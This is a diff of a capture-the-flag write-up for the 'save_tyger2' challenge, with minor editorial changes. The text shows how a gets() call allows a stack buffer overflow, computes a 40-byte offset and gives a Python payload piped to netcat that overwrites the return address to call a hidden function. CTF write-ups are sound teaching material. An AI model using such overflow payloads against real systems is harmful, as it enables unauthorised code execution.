@@ -6,11 +6,11 @@ Tyger needs your help again.
 <br>
 Connect with `nc litctf.live 31788`
 
-[save_tyger2](https://drive.google.com/uc?export=download&id=1qCSTo01YjzrncT0SZGOTouC4egY_q-PX)
+[`save_tyger2`](https://drive.google.com/file/d/1qCSTo01YjzrncT0SZGOTouC4egY_q-PX/view)
 
 ## Solution
 
-Like last time, we're given a C file (and an executable):
+Like [last time](./save_tyger.md), we're given a C file (and the executable):
 ```c
 #include <stdlib.h>
 #include <stdio.h>
@@ -53,8 +53,9 @@ We need to somehow call `cell()`. Note the usage of `gets` for input, which lets
   4011ed:	48 89 c7             	mov    %rax,%rdi
   4011f0:	b8 00 00 00 00       	mov    $0x0,%eax
   4011f5:	e8 56 fe ff ff       	callq  401050 <gets@plt>
+...
 ```
-`cell()` is at `0x0000000000401162` (pointers are 64-bit, or 8 bytes). `buf` is at `%rbp - 0x20`.
+`cell()` is at `0x0000000000401162` (addresses are 64-bit, or 8 bytes). `buf` is at `%rbp - 0x20`.
 That means we need `0x20 = `32 bytes to reach `%rbp`, which points to the address of the previous stack frame, which is 8 bytes long.
 Past that is the return address location, so we need to skip 40 bytes total.
 So we need to send 40 junk characters, and then `0x0000000000401162`:
@@ -63,7 +64,7 @@ print("a"*40+"6211400000000000".decode("hex"))
 ```
 Note the leading/trailing 0s are important, to overwrite the entirety of the original address.
 
-Pipe the python output into the netcat command, and we get our flag.
+Pipe the Python output into the netcat command, and we get our flag.
 
 ## Flag
 
